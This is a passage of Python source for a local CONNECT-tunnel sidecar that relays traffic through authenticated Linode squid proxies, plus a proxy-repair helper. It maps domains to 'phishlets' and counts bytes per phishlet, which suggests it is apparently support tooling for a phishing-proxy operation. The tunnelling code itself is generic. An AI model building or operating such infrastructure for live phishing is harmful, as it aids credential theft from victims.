            _notify("Proxy repaired", f"{label} ({ip}) squid is up.", "success")
        else:
            _notify("Proxy repair failed", f"{label} ({ip}): {err}. Instance was NOT deleted.", "error")
    return public_state()


def repair_async(linode_id):
    t = threading.Thread(target=repair_instance, args=(int(linode_id),), daemon=True)
    t.start()


class _Sidecar(threading.Thread):
    def __init__(self):
        super().__init__(daemon=True)
        self._sock = None

    def run(self):
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("127.0.0.1", SIDECAR_PORT))
        srv.listen(64)
        self._sock = srv
        while True:
            try:
                c, _ = srv.accept()
            except Exception:
                break
            threading.Thread(target=self._client, args=(c,), daemon=True).start()

    def _client(self, client):
        remote = None
        track = None
        try:
            client.settimeout(20)
            buf = b""
            while b"\r\n\r\n" not in buf:
                chunk = client.recv(4096)
                if not chunk:
                    return
                buf += chunk
                if len(buf) > 65536:
                    return
            line = buf.split(b"\r\n", 1)[0].decode("latin1", "replace")
            parts = line.split()
            if len(parts) < 2 or parts[0].upper() != "CONNECT":
                client.sendall(b"HTTP/1.1 405 Method Not Allowed\r\nConnection: close\r\n\r\n")
                return
            hostport = parts[1]
            if ":" in hostport:
                host, port_s = hostport.rsplit(":", 1)
                port = int(port_s)
            else:
                host, port = hostport, 443
            px = pick_proxy(host)
            pl = domain_to_phishlet(host)
            px_id = (px or {}).get("id")
            track = None
            if px and px.get("ipv4"):
                remote = socket.create_connection((px["ipv4"], int(px.get("port") or SQUID_PORT)), 12)
                token = base64.b64encode(f"{px.get('squid_user','')}:{px.get('squid_pass','')}".encode()).decode()
                remote.sendall(
                    f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}:{port}\r\nProxy-Authorization: Basic {token}\r\n\r\n".encode()
                )
                rbuf = b""
                remote.settimeout(15)
                while b"\r\n\r\n" not in rbuf:
                    ch = remote.recv(4096)
                    if not ch:
                        break
                    rbuf += ch
                if b" 200" not in rbuf.split(b"\r\n", 1)[0]:
                    client.sendall(b"HTTP/1.1 502 Bad Gateway\r\nConnection: close\r\n\r\n")
                    return
                client.sendall(b"HTTP/1.1 200 Connection Established\r\n\r\n")
            else:
                remote = socket.create_connection((host, port), 12)
                client.sendall(b"HTTP/1.1 200 Connection Established\r\n\r\n")
            track = _track_tunnel(px_id, client, remote)
            client.settimeout(None)
            remote.settimeout(None)
            done = threading.Event()
            acc = {"out": 0, "in": 0, "t": time.time()}
            acc_lock = threading.Lock()

            def flush_bytes(force=False):
                with acc_lock:
                    now = time.time()
                    if not force and now - acc["t"] < 2:
                        return
                    n_out, n_in = acc["out"], acc["in"]
                    acc["out"] = acc["in"] = 0
                    acc["t"] = now
                if px_id and pl:
                    _add_bytes(px_id, pl, n_out, n_in)

            def pump(a, b, direction):
                try:
                    while not done.is_set():
                        d = a.recv(16384)
                        if not d:
                            break
                        b.sendall(d)
                        with acc_lock:
                            acc[direction] += len(d)
                        flush_bytes(False)
                except Exception:
                    pass
                done.set()
                try:
                    b.shutdown(socket.SHUT_WR)
                except Exception:
                    pass
                flush_bytes(True)

            t1 = threading.Thread(target=pump, args=(client, remote, "out"), daemon=True)
            t2 = threading.Thread(target=pump, args=(remote, client, "in"), daemon=True)
            t1.start()
            t2.start()
            t1.join()
            t2.join()
        except Exception:
            try:
                client.sendall(b"HTTP/1.1 502 Bad Gateway\r\nConnection: close\r\n\r\n")
            except Exception:
                pass
        finally:
            _untrack_tunnel(track)
            for x in (client, remote):
                try:
                    x.close()
                except Exception:
                    pass


_sidecar_started = False


def start_sidecar():
    global _sidecar_started
    if _sidecar_started:
        return
    _sidecar_started = True
    _Sidecar().start()
